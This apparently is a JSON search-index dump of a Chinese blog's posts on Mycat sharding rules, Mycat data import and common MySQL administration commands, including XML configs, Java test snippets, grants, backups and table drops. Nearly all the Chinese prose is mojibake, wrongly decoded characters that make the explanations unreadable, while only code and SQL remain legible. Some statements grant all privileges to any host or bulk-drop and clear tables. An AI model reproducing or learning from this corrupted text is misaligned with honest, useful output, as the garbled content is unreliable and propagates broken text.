è¡¨ç¤ºå¯¼æ•°æ®æ—¶ä¸åŠ é”ï¼Œå¦‚æœåŠ é”æ¶‰åŠå¤šåˆ†ç‰‡æ—¶å®¹æ˜“å¯¼è‡´æ­»é”ã€‚# --skip-extended-insert å°†æ¯è¡Œæ•°æ®è¾“å‡ºä¸ºä¸€ä¸ªå•ç‹¬çš„insertè¯­å¥# --no-autocommit å‚æ•°åœ¨æ¯ä¸ªè¡¨æ ¼æ‰€æœ‰çš„æ’å…¥è¯­å¥çš„å‰ååˆ†åˆ«å¢åŠ SET autocommit = 0å’ŒCOMMITè¯­å¥ã€‚ç›¸æ¯”æ²¡æœ‰è¿™ä¸ªå‚æ•°ï¼Œæ’å…¥é€Ÿåº¦èƒ½å·®å‡ºè‡³å°‘200å€ï¼Œåˆ†åˆ«æ˜¯10000QPSå’Œ50QPS å¯¼å…¥æ•°æ® 123mysql -uroot -ptest -h192.168.99.216 -P8006 TESTDB #è¿æ¥Mycatsource /t_rune.sql #å¯¼å…¥æ•°æ® æˆåŠŸåå¯ä»¥åœ¨server2ä¸­çœ‹åˆ°db1,db2.db3å·²ç»å­˜å…¥æ•°æ®ã€‚é”™è¯¯æ—¥å¿—åœ¨ logs/mycat.logæ–‡ä»¶ä¸­ è¿æ¥Mycat select * from table æ—¶ï¼ŒMycaté»˜è®¤limit 100æ­¤é…ç½®å¯ä»schema.xmlæ–‡ä»¶ä¸­ä¿®æ”¹sqlMaxLimit=&quot;100&quot;å®šä¹‰ 0x04 ä¼šç”¨åˆ°çš„sqlæŸ¥è¯¢æ‰€æœ‰è¡¨çš„ä¸»é”® 1SELECT k.column_name,k.table_name FROM information_schema.table_constraints t JOIN information_schema.key_column_usage k USING (constraint_name,table_schema,table_name) WHERE t.constraint_type='PRIMARY KEY' AND t.table_schema='æ•°æ®åº“'; æŸ¥è¯¢æ‰€æœ‰è¡¨çš„è®°å½•æ•°(è¡Œæ•°) 123select table_name,table_rows from information_schema.tables where TABLE_SCHEMA = 'æ•°æ®åº“' order by table_rows desc;#å¯¹äºInnoDBè¡¨ï¼Œtable_rowsè¡Œè®¡æ•°ä»…æ˜¯å¤§æ¦‚ä¼°è®¡å€¼ã€‚","raw":null,"content":null,"categories":[{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://kionf.com/categories/æ•°æ®åº“/"},{"name":"Mycat","slug":"æ•°æ®åº“/Mycat","permalink":"https://kionf.com/categories/æ•°æ®åº“/Mycat/"}],"tags":[{"name":"Mycat","slug":"Mycat","permalink":"https://kionf.com/tags/Mycat/"}]},{"title":"Mycatåˆ†ç‰‡è§„åˆ™","slug":"mycat-alg","date":"2017-05-06T16:00:00.000Z","updated":"2018-10-31T10:19:28.311Z","comments":true,"path":"2017/05/07/mycat-alg/","link":"","permalink":"https://kionf.com/2017/05/07/mycat-alg/","excerpt":"å¸¸ç”¨çš„æ ¹æ®ä¸»é”®æˆ–éä¸»é”®çš„åˆ†ç‰‡è§„åˆ™é…ç½® \n","text":"å¸¸ç”¨çš„æ ¹æ®ä¸»é”®æˆ–éä¸»é”®çš„åˆ†ç‰‡è§„åˆ™é…ç½® 1. æšä¸¾æ³•ï¼š é€šè¿‡åœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®å¯èƒ½çš„æšä¸¾idï¼Œè‡ªå·±é…ç½®åˆ†ç‰‡ï¼Œä½¿ç”¨è§„åˆ™ï¼š 12345678910111213141516&lt;tableRule name=\"sharding-by-intfile\"&gt; &lt;rule&gt; &lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--åˆ†ç‰‡å‡½æ•°--&gt; &lt;algorithm&gt;hash-int&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name=\"hash-int\" class=\"org.opencloudb.route.function.PartitionByFileMap\"&gt; &lt;!--æ ‡è¯†é…ç½®æ–‡ä»¶åç§°--&gt; &lt;property name=\"mapFile\"&gt;partition-hash-int.txt&lt;/property&gt; &lt;!--typeé»˜è®¤å€¼ä¸º0ï¼Œ0è¡¨ç¤ºIntegerï¼Œéé›¶è¡¨ç¤ºString--&gt; &lt;property name=\"type\"&gt;0&lt;/property&gt; &lt;!--æ‰€æœ‰çš„èŠ‚ç‚¹é…ç½®éƒ½æ˜¯ä»0å¼€å§‹ï¼ŒåŠ0ä»£è¡¨èŠ‚ç‚¹1--&gt; &lt;property name=\"defaultNode\"&gt;0&lt;/property&gt;&lt;/function&gt; partition-hash-int.txt é…ç½®ï¼š 12310000=010010=1DEFAULT_NODE=1 defaultNode é»˜è®¤èŠ‚ç‚¹:å°äº0è¡¨ç¤ºä¸è®¾ç½®é»˜è®¤èŠ‚ç‚¹ï¼Œå¤§äºç­‰äº0è¡¨ç¤ºè®¾ç½®é»˜è®¤èŠ‚ç‚¹ é»˜è®¤èŠ‚ç‚¹çš„ä½œç”¨ï¼šæšä¸¾åˆ†ç‰‡æ—¶ï¼Œå¦‚æœç¢°åˆ°ä¸è¯†åˆ«çš„æšä¸¾å€¼ï¼Œå°±è®©å®ƒè·¯ç”±åˆ°é»˜è®¤èŠ‚ç‚¹å¦‚æœä¸é…ç½®é»˜è®¤èŠ‚ç‚¹ï¼ˆdefaultNodeå€¼å°äº0è¡¨ç¤ºä¸é…ç½®é»˜è®¤èŠ‚ç‚¹ï¼‰ï¼Œç¢°åˆ°ä¸è¯†åˆ«çš„æšä¸¾å€¼å°±ä¼šæŠ¥é”™ï¼Œ like thisï¼šcan&#39;t find datanode for sharding column:column_name val:ffffffff 2.å›ºå®šåˆ†ç‰‡hashç®—æ³•12345678910111213141516&lt;tableRule name=\"rule1\"&gt; &lt;rule&gt; &lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--åˆ†ç‰‡å‡½æ•°--&gt; &lt;algorithm&gt;func1&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name=\"func1\" class=\"org.opencloudb.route.function.PartitionByLong\"&gt; &lt;!--åˆ†ç‰‡ä¸ªæ•°åˆ—è¡¨--&gt; &lt;property name=\"partitionCount\"&gt;2,1&lt;/property&gt; &lt;!--åˆ†ç‰‡èŒƒå›´åˆ—è¡¨--&gt; &lt;property name=\"partitionLength\"&gt;256,512&lt;/property&gt; &lt;!--åˆ†åŒºé•¿åº¦:é»˜è®¤ä¸ºæœ€å¤§2^n=1024 ,å³æœ€å¤§æ”¯æŒ1024åˆ†åŒº--&gt;&lt;/function&gt; çº¦æŸ : 123count,lengthä¸¤ä¸ªæ•°ç»„çš„é•¿åº¦å¿…é¡»æ˜¯ä¸€è‡´çš„ã€‚1024 = sum((count[i]*length[i])). countå’Œlengthä¸¤ä¸ªå‘é‡çš„ç‚¹ç§¯æ’ç­‰äº1024 ç”¨æ³•ä¾‹å­ï¼š 123456789101112131415161718192021222324252627 æœ¬ä¾‹çš„åˆ†åŒºç­–ç•¥ï¼šå¸Œæœ›å°†æ•°æ®æ°´å¹³åˆ†æˆ3ä»½ï¼Œå‰ä¸¤ä»½å„å 25%ï¼Œç¬¬ä¸‰ä»½å 50%ã€‚ï¼ˆæ•…æœ¬ä¾‹éå‡åŒ€åˆ†åŒºï¼‰ // |&lt;---------------------1024------------------------&gt;| // |&lt;----256---&gt;|&lt;----256---&gt;|&lt;----------512----------&gt;| // | partition0 | partition1 | partition2 | // | å…±2ä»½,æ•…count[0]=2 | å…±1ä»½ï¼Œæ•…count[1]=1 | int[] count = new int[] &#123; 2, 1 &#125;; int[] length = new int[] &#123; 256, 512 &#125;; PartitionUtil pu = new PartitionUtil(count, length); // ä¸‹é¢ä»£ç æ¼”ç¤ºåˆ†åˆ«ä»¥offerIdå­—æ®µæˆ–memberIdå­—æ®µæ ¹æ®ä¸Šè¿°åˆ†åŒºç­–ç•¥æ‹†åˆ†çš„åˆ†é…ç»“æœ int DEFAULT_STR_HEAD_LEN = 8; // cobaré»˜è®¤ä¼šé…ç½®ä¸ºæ­¤å€¼ long offerId = 12345; String memberId = \"qiushuo\"; // è‹¥æ ¹æ®offerIdåˆ†é…ï¼ŒpartNo1å°†ç­‰äº0ï¼Œå³æŒ‰ç…§ä¸Šè¿°åˆ†åŒºç­–ç•¥ï¼ŒofferIdä¸º12345æ—¶å°†ä¼šè¢«åˆ†é…åˆ°partition0ä¸­ int partNo1 = pu.partition(offerId); // è‹¥æ ¹æ®memberIdåˆ†é…ï¼ŒpartNo2å°†ç­‰äº2ï¼Œå³æŒ‰ç…§ä¸Šè¿°åˆ†åŒºç­–ç•¥ï¼ŒmemberIdä¸ºqiushuoæ—¶å°†ä¼šè¢«åˆ†åˆ°partition2ä¸­ int partNo2 = pu.partition(memberId, 0, DEFAULT_STR_HEAD_LEN);å¦‚æœéœ€è¦å¹³å‡åˆ†é…è®¾ç½®ï¼šå¹³å‡åˆ†ä¸º4åˆ†ç‰‡ï¼ŒpartitionCount*partitionLength=1024&lt;function name=\"func1\" class=\"org.opencloudb.route.function.PartitionByLong\"&gt; &lt;property name=\"partitionCount\"&gt;4&lt;/property&gt; &lt;property name=\"partitionLength\"&gt;256&lt;/property&gt;&lt;/function&gt; 3.èŒƒå›´çº¦å®š123456789101112&lt;tableRule name=\"auto-sharding-long\"&gt; &lt;rule&gt; &lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--åˆ†ç‰‡å‡½æ•°--&gt; &lt;algorithm&gt;rang-long&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name=\"rang-long\" class=\"org.opencloudb.route.function.AutoPartitionByLong\"&gt; &lt;!--é…ç½®æ–‡ä»¶è·¯å¾„--&gt; &lt;property name=\"mapFile\"&gt;autopartition-long.txt&lt;/property&gt;&lt;/function&gt; autopartition-long.txtï¼š 123456789# range start-end ,data node index# æ‰€æœ‰çš„èŠ‚ç‚¹é…ç½®éƒ½æ˜¯ä»0å¼€å§‹ï¼ŒåŠ0ä»£è¡¨èŠ‚ç‚¹1ï¼Œæ­¤é…ç½®éå¸¸ç®€å•ï¼Œå³é¢„å…ˆåˆ¶å®šå¯èƒ½çš„idèŒƒå›´åˆ°æŸä¸ªåˆ†ç‰‡# K=1000,M=10000.0-500M=0500M-1000M=11000M-1500M=2æˆ–0-10000000=010000001-20000000=1 4.æ±‚æ¨¡æ³•123456789101112&lt;tableRule name=\"mod-long\"&gt; &lt;rule&gt; &lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--åˆ†ç‰‡å‡½æ•°--&gt; &lt;algorithm&gt;mod-long&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name=\"mod-long\" class=\"org.opencloudb.route.function.PartitionByMod\"&gt; &lt;!--æ³¨æ„ï¼è¿™é‡Œå¡«å†™æ•°æ®åº“èŠ‚ç‚¹æ•°ï¼Œå¦åˆ™æ— æ³•åˆ†ç‰‡--&gt; &lt;property name=\"count\"&gt;3&lt;/property&gt;&lt;/function&gt; æ­¤ç§é…ç½®éå¸¸æ˜ç¡®å³æ ¹æ®idè¿›è¡Œåè¿›åˆ¶æ±‚æ¨¡é¢„ç®—ï¼Œç›¸æ¯”æ–¹å¼1ï¼Œæ­¤ç§åœ¨æ‰¹é‡æ’å…¥æ—¶éœ€è¦åˆ‡æ¢æ•°æ®æºï¼Œidä¸è¿ç»­ 5.æ—¥æœŸåˆ—åˆ†åŒºæ³•12345678910111213&lt;tableRule name=\"sharding-by-date\"&gt; &lt;rule&gt; &lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt; &lt;columns&gt;create_time&lt;/columns&gt; &lt;!--åˆ†ç‰‡å‡½æ•°--&gt; &lt;algorithm&gt;sharding-by-date&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt; &lt;function name=\"sharding-by-date\" class=\"org.opencloudb.route.function.PartitionByDate\"&gt; &lt;property name=\"dateFormat\"&gt;yyyy-MM-dd&lt;/property&gt; &lt;property name=\"sBeginDate\"&gt;2015-01-01&lt;/property&gt; &lt;property name=\"sPartionDay\"&gt;10&lt;/property&gt;&lt;/function&gt; é…ç½®ä¸­é…ç½®äº†å¼€å§‹æ—¥æœŸï¼Œåˆ†åŒºå¤©æ•°ï¼Œå³é»˜è®¤ä»å¼€å§‹æ—¥æœŸç®—èµ·ï¼Œåˆ†éš”10å¤©ä¸€ä¸ªåˆ†åŒº 1234Assert.assertEquals(true, 0 == partition.calculate(&quot;2015-01-01&quot;));Assert.assertEquals(true, 0 == partition.calculate(&quot;2015-01-10&quot;));Assert.assertEquals(true, 1 == partition.calculate(&quot;2015-01-11&quot;));Assert.assertEquals(true, 12 == partition.calculate(&quot;2015-05-01&quot;)); 6.é€šé…å–æ¨¡1234567891011121314151617&lt;tableRule name=\"sharding-by-pattern\"&gt; &lt;rule&gt; &lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--åˆ†ç‰‡å‡½æ•°--&gt; &lt;algorithm&gt;sharding-by-pattern&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name=\"sharding-by-pattern\" class=\"org.opencloudb.route.function.PartitionByPattern\"&gt; &lt;!--æ±‚æ¨¡åŸºæ•°--&gt; &lt;property name=\"patternValue\"&gt;256&lt;/property&gt; &lt;!--é»˜è®¤èŠ‚ç‚¹--&gt; &lt;!--å¦‚æœé…ç½®äº†é»˜è®¤ï¼Œåˆ™ä¸ä¼šæŒ‰ç…§æ±‚æ¨¡è¿ç®—--&gt; &lt;property name=\"defaultNode\"&gt;2&lt;/property&gt; &lt;!-- é…ç½®æ–‡ä»¶è·¯å¾„--&gt; &lt;property name=\"mapFile\"&gt;partition-pattern.txt&lt;/property&gt;&lt;/function&gt; partition-pattern.txt ï¼š 1234567891011121314# id partition range start-end ,data node index###### first host configuration1-32=033-64=165-96=297-128=3######## second host configuration129-160=4161-192=5193-224=6225-256=70-0=7#1-32 å³ä»£è¡¨id%256ååˆ†å¸ƒçš„èŒƒå›´ï¼Œå¦‚æœåœ¨1-32åˆ™åœ¨åˆ†åŒº1ï¼Œå…¶ä»–ç±»æ¨ï¼Œå¦‚æœidéæ•°æ®ï¼Œåˆ™ä¼šåˆ†é…åœ¨defaoultNode é»˜è®¤èŠ‚ç‚¹ 7. ASCIIç æ±‚æ¨¡é€šé…12345678910111213141516&lt;tableRule name=\"sharding-by-prefixpattern\"&gt; &lt;rule&gt; &lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--åˆ†ç‰‡å‡½æ•°--&gt; &lt;algorithm&gt;sharding-by-prefixpattern&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name=\"sharding-by-pattern\" class=\"org.opencloudb.route.function.PartitionByPattern\"&gt; &lt;!--æ±‚æ¨¡åŸºæ•°--&gt; &lt;property name=\"patternValue\"&gt;256&lt;/property&gt; &lt;!--ASCII æˆªå–çš„ä½æ•°--&gt; &lt;property name=\"prefixLength\"&gt;5&lt;/property&gt; &lt;!-- é…ç½®æ–‡ä»¶è·¯å¾„--&gt; &lt;property name=\"mapFile\"&gt;partition-pattern.txt&lt;/property&gt;&lt;/function&gt; partition-pattern.txtï¼š 1234567891011121314151617# range start-end ,data node index# ASCII# 48-57=0-9# 64ã€65-90=@ã€A-Z# 97-122=a-z###### first host configuration1-4=05-8=19-12=213-16=3###### second host configuration17-20=421-24=525-28=629-32=70-0=7#1-32 å³ä»£è¡¨id%256ååˆ†å¸ƒçš„èŒƒå›´ï¼Œå¦‚æœåœ¨1-32åˆ™åœ¨åˆ†åŒº1ï¼Œå…¶ä»–ç±»æ¨ æ­¤ç§æ–¹å¼ç±»ä¼¼æ–¹å¼6åªä¸è¿‡é‡‡å–çš„æ˜¯å°†åˆ—ç§è·å–å‰prefixLengthä½åˆ—æ‰€æœ‰ASCIIç çš„å’Œè¿›è¡Œæ±‚æ¨¡sum%patternValue ,è·å–çš„å€¼ï¼Œåœ¨é€šé…èŒƒå›´å†…çš„å³ åˆ†ç‰‡æ•°ï¼Œ ASCIIç¼–ç ï¼š48-57=0-9é˜¿æ‹‰ä¼¯æ•°å­—64ã€65-90=@ã€A-Z97-122=a-z ä¾‹å¦‚ï¼š 12345678String idVal=&quot;gf89f9a&quot;;Assert.assertEquals(true, 0==autoPartition.calculate(idVal));idVal=&quot;8df99a&quot;;Assert.assertEquals(true, 4==autoPartition.calculate(idVal));idVal=&quot;8dhdf99a&quot;;Assert.assertEquals(true, 3==autoPartition.calculate(idVal)); 8.ç¼–ç¨‹æŒ‡å®š1234567891011121314&lt;tableRule name=\"sharding-by-substring\"&gt; &lt;rule&gt; &lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--åˆ†ç‰‡å‡½æ•°--&gt; &lt;algorithm&gt;sharding-by-substring&lt;/algorithm&gt; &lt;/rule&gt; &lt;/tableRule&gt;&lt;function name=\"sharding-by-substring\" class=\"org.opencloudb.route.function.PartitionDirectBySubString\"&gt; &lt;property name=\"startIndex\"&gt;0&lt;/property&gt; &lt;!-- zero-based --&gt; &lt;property name=\"size\"&gt;2&lt;/property&gt; &lt;property name=\"partitionCount\"&gt;8&lt;/property&gt; &lt;property name=\"defaultPartition\"&gt;0&lt;/property&gt;&lt;/function&gt; æ­¤æ–¹æ³•ä¸ºç›´æ¥æ ¹æ®å­—ç¬¦å­ä¸²ï¼ˆå¿…é¡»æ˜¯æ•°å­—ï¼‰è®¡ç®—åˆ†åŒºå·ï¼ˆç”±åº”ç”¨ä¼ é€’å‚æ•°ï¼Œæ˜¾å¼æŒ‡å®šåˆ†åŒºå·ï¼‰ã€‚ä¾‹å¦‚id=05-100000002åœ¨æ­¤é…ç½®ä¸­ä»£è¡¨æ ¹æ®idä¸­ä»startIndex=0ï¼Œå¼€å§‹ï¼Œæˆªå–siz=2ä½æ•°å­—å³05ï¼Œ05å°±æ˜¯è·å–çš„åˆ†åŒºï¼Œå¦‚æœæ²¡ä¼ é»˜è®¤åˆ†é…åˆ°defaultPartition 9.å­—ç¬¦ä¸²æ‹†åˆ†hashè§£æ12345678910111213141516&lt;tableRule name=\"sharding-by-stringhash\"&gt; &lt;rule&gt; &lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;!--åˆ†ç‰‡å‡½æ•°--&gt; &lt;algorithm&gt;sharding-by-stringhash&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name=\"sharding-by-substring\" class=\"org.opencloudb.route.function.PartitionDirectBySubString\"&gt; &lt;!--å­—ç¬¦ä¸²hashæ±‚æ¨¡åŸºæ•°--&gt; &lt;property name=length&gt;512&lt;/property&gt; &lt;!-- zero-based --&gt; &lt;!--åˆ†åŒºæ•°--&gt; &lt;property name=\"count\"&gt;2&lt;/property&gt; &lt;!--é¢„ç®—ä½--&gt; &lt;property name=\"hashSlice\"&gt;0:2&lt;/property&gt;&lt;/function&gt; hashSlice ï¼š 0 means str.length(), -1 means str.length()-1 123456&gt; &quot;2&quot; -&amp;gt; (0,2)&lt;br/&gt;&gt; &quot;1:2&quot; -&amp;gt; (1,2)&lt;br/&gt;&gt; &quot;1:&quot; -&amp;gt; (1,0)&lt;br/&gt;&gt; &quot;-1:&quot; -&amp;gt; (-1,0)&lt;br/&gt;&gt; &quot;:-1&quot; -&amp;gt; (0,-1)&lt;br/&gt;&gt; &quot;:&quot; -&amp;gt; (0,0)&lt;br/&gt; ä¾‹å­ï¼š 1234567891011121314151617181920212223String idVal=null; rule.setPartitionLength(&quot;512&quot;); rule.setPartitionCount(&quot;2&quot;); rule.init(); rule.setHashSlice(&quot;0:2&quot;);// idVal = &quot;0&quot;;// Assert.assertEquals(true, 0 == rule.calculate(idVal));// idVal = &quot;45a&quot;;// Assert.assertEquals(true, 1 == rule.calculate(idVal)); //last 4rule = new PartitionByString();rule.setPartitionLength(&quot;512&quot;);rule.setPartitionCount(&quot;2&quot;);rule.init();//last 4 charactersrule.setHashSlice(&quot;-4:0&quot;);idVal = &quot;aaaabbb0000&quot;;Assert.assertEquals(true, 0 == rule.calculate(idVal));idVal = &quot;aaaabbb2359&quot;;Assert.assertEquals(true, 0 == rule.calculate(idVal)); 10. ä¸€è‡´æ€§hash1234567891011121314151617&lt;tableRule name=\"sharding-by-murmur\"&gt; &lt;rule&gt; &lt;columns&gt;user_id&lt;/columns&gt; &lt;algorithm&gt;murmur&lt;/algorithm&gt; &lt;/rule&gt;&lt;/tableRule&gt;&lt;function name=\"murmur\" class=\"org.opencloudb.route.function.PartitionByMurmurHash\"&gt; &lt;property name=\"seed\"&gt;0&lt;/property&gt;&lt;!-- é»˜è®¤æ˜¯0--&gt; &lt;property name=\"count\"&gt;2&lt;/property&gt;&lt;!-- è¦åˆ†ç‰‡çš„æ•°æ®åº“èŠ‚ç‚¹æ•°é‡ï¼Œå¿…é¡»æŒ‡å®šï¼Œå¦åˆ™æ²¡æ³•åˆ†ç‰‡--&gt; &lt;property name=\"virtualBucketTimes\"&gt;160&lt;/property&gt;&lt;!-- ä¸€ä¸ªå®é™…çš„æ•°æ®åº“èŠ‚ç‚¹è¢«æ˜ å°„ä¸ºè¿™ä¹ˆå¤šè™šæ‹ŸèŠ‚ç‚¹ï¼Œé»˜è®¤æ˜¯160å€ï¼Œä¹Ÿå°±æ˜¯è™šæ‹ŸèŠ‚ç‚¹æ•°æ˜¯ç‰©ç†èŠ‚ç‚¹æ•°çš„160å€--&gt; &lt;!-- &lt;property name=\"weightMapFile\"&gt;weightMapFile&lt;/property&gt; èŠ‚ç‚¹çš„æƒé‡ï¼Œæ²¡æœ‰æŒ‡å®šæƒé‡çš„èŠ‚ç‚¹é»˜è®¤æ˜¯1ã€‚ä»¥propertiesæ–‡ä»¶çš„æ ¼å¼å¡«å†™ï¼Œä»¥ä»0å¼€å§‹åˆ°count-1çš„æ•´æ•°å€¼ä¹Ÿå°±æ˜¯èŠ‚ç‚¹ç´¢å¼•ä¸ºkeyï¼Œä»¥èŠ‚ç‚¹æƒé‡å€¼ä¸ºå€¼ã€‚æ‰€æœ‰æƒé‡å€¼å¿…é¡»æ˜¯æ­£æ•´æ•°ï¼Œå¦åˆ™ä»¥1ä»£æ›¿ --&gt; &lt;!-- &lt;property name=\"bucketMapPath\"&gt;/etc/mycat/bucketMapPath&lt;/property&gt; ç”¨äºæµ‹è¯•æ—¶è§‚å¯Ÿå„ç‰©ç†èŠ‚ç‚¹ä¸è™šæ‹ŸèŠ‚ç‚¹çš„åˆ†å¸ƒæƒ…å†µï¼Œå¦‚æœæŒ‡å®šäº†è¿™ä¸ªå±æ€§ï¼Œä¼šæŠŠè™šæ‹ŸèŠ‚ç‚¹çš„murmur hashå€¼ä¸ç‰©ç†èŠ‚ç‚¹çš„æ˜ å°„æŒ‰è¡Œè¾“å‡ºåˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œæ²¡æœ‰é»˜è®¤å€¼ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œå°±ä¸ä¼šè¾“å‡ºä»»ä½•ä¸œè¥¿ --&gt;&lt;/function&gt; ä¸€è‡´æ€§hashé¢„ç®—æœ‰æ•ˆè§£å†³äº†åˆ†å¸ƒå¼æ•°æ®çš„æ‰©å®¹é—®é¢˜ï¼Œå‰1-9ä¸­idè§„åˆ™éƒ½å¤šå°‘å­˜åœ¨æ•°æ®æ‰©å®¹éš¾é¢˜ï¼Œè€Œ10è§„åˆ™è§£å†³äº†æ•°æ®æ‰©å®¹éš¾ç‚¹","raw":null,"content":null,"categories":[{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://kionf.com/categories/æ•°æ®åº“/"},{"name":"Mycat","slug":"æ•°æ®åº“/Mycat","permalink":"https://kionf.com/categories/æ•°æ®åº“/Mycat/"}],"tags":[{"name":"Mycat","slug":"Mycat","permalink":"https://kionf.com/tags/Mycat/"}]},{"title":"å¸¸ç”¨Mysqlè¯­å¥","slug":"mysql-sql","date":"2017-03-13T16:00:00.000Z","updated":"2018-10-31T10:19:28.315Z","comments":true,"path":"2017/03/14/mysql-sql/","link":"","permalink":"https://kionf.com/2017/03/14/mysql-sql/","excerpt":"çºªå½•è¿ç»´è¿‡ç¨‹å¸¸ç”¨çš„sqlèªå¥ï¼Œå¤‡å¿˜ åˆ›å»ºæ•°æ®åº“ CREATE DATABASE test CHARACTER SET UTF8; å­—ç¬¦é›†ä¸ºUTF8\n","text":"çºªå½•è¿ç»´è¿‡ç¨‹å¸¸ç”¨çš„sqlèªå¥ï¼Œå¤‡å¿˜ åˆ›å»ºæ•°æ®åº“ CREATE DATABASE test CHARACTER SET UTF8; å­—ç¬¦é›†ä¸ºUTF8 0x01 ç”¨æˆ¶å¯†ç åŠç™»é™†ç›¸å…³1. æ›´æ”¹å¯†ç 12update user set password=password('root') where user='root';flush privileges; 2. å…è®¸è¿œç¨‹ç™»å½•12grant all privileges on *.* to 'username'@'%' identified by 'password' with grant option;flush privileges; 3. æ›´æ”¹Mysqlç›‘å¬åœ°å€123vim /etc/my.cnf#åœ¨[mysqld]ä¸­æ·»åŠ bind-address=127.0.0.1 4. åˆ›å»ºç”¨æˆ·123grant all privileges on database.tables to 'username'@'127.0.0.1' identified by 'password' with grant option;flush privileges;# all privileges ---- æ‰€æœ‰æƒé™(å¯æŒ‡å®šSELECT,DROP,UPDATE,INSTER....) 5. æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ¶åŸºæœ¬ä¿¡æ¯1SELECT user,host,password FROM mysql.user;?? åˆå§‹å®‰è£æ•°æ®åº“ä½¿ç”¨mysqladminè®¾ç½®å¯†ç åï¼Œç›´æ¥ä½¿ç”¨mysql -uroot -ppasswd ç™»é™†æ­£å¸¸ï¼Œä½¿ç”¨mysql -uroot -ppasswd -h127.0.0.1æŠ¥é”™:Access denied for user â€˜rootâ€˜@â€™hostnameâ€™è®¾ç½®å…è®¸è¿œç¨‹ç™»é™†,ä»ç„¶æŠ¥é”™è¿™æ—¶ä½¿ç”¨SELECT user,host,password FROM mysql.user;è¯­å¥è¿›è¡ŒæŸ¥è¯¢+â€”â€”â€“+â€”â€”â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+| root | localhost | 3E8000C2FA234A170531B9063518B3B479E7C47B || root | 127.0.0.1 | 2E9879C2FA764A1705567896B518B3B47324EA23 |+â€”â€”â€“+â€”â€”â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+æ›´æ”¹ç‚ºç›¸åŒå³å¯ 0x02 æ•°æ®å¢åˆªæ”¹æŸ¥1. æ‰¹é‡åˆªé™¤åŒ¹é…çš„è¡¨123456789101112131415161718ä¾‹ï¼š+-----------------------------+| userregin2017_03_01 || userregin2017_03_02 || userregin2017_03_03 || userregin2017_03_04 || userregin2017_03_05 || userregin2017_03_06 || userregin2017_03_07 || userregin2017_03_08 || userregin2017_03_09 || userregin2017_03_10 || userregin2017_03_11 || userregin2017_03_12 || userregin2017_03_13 |+-----------------------------+Select CONCAT( 'drop table ', table_name, ';' ) FROM information_schema.tables Where table_name LIKE 'userregin%';# å¯¼å‡ºçš„æ•°æ®ä½¿ç”¨vimç¼–è¾‘Ctrl+v(é€‰å–) &gt;&gt; Shift+i &gt;&gt; ç¼–è¾‘ &gt;&gt; Esc &gt;&gt; æ–¹å‘é”®ä¸‹ 2. æŸ¥è¯¢æ•°æ®åº“å¤§å°1SELECT concat((SUM(DATA_LENGTH)+SUM(INDEX_LENGTH))/1024/1024,'MB') as data FROM information_schema.tables WHERE TABLE_SCHEMA='your_database'; 3. æŸ¥è¯¢è¡¨å¤§å°1SELECT concat((SUM(DATA_LENGTH)+SUM(INDEX_LENGTH))/1024/1024,'MB') as data FROM information_schema.tables WHERE TABLE_SCHEMA='your_database' and TABLE_NAME='your_table'; 4. æŸ¥è¯¢è¡¨ç»“æ„1desc your_tableï¼› 5. æŸ¥è¯¢å»ºè¡¨è¯­å¥1show create table table_name; 6. åˆªé™¤æ¸…ç©ºè¡¨æ•°æ®ï¼š 123delete from tableï¼›delete from table where id=1;#å¸¦è§„åˆ™æ¸…é™¤ 7. æŸ¥è¯¢è¡¨ä¸­NAMEå­—æ®µæœ‰å“ªäº›ç±»å‹1select NAME from t_user group by NAME; 0x03 å¤‡ä»½è¿˜åŸå‹ç¼©å¤‡ä»½ï¼š 1mysqldump -B -uroot -proot Your_database| gzip &gt; Your_database.sql.gz å‹ç¼©è¿˜åŸï¼š 1gunzip &lt; Your_database.sql.gz | mysql -uroot -proot sqlæ–‡ä»¶è¿˜åŸï¼š 123mysql -uroot -prootuse Your_database;source 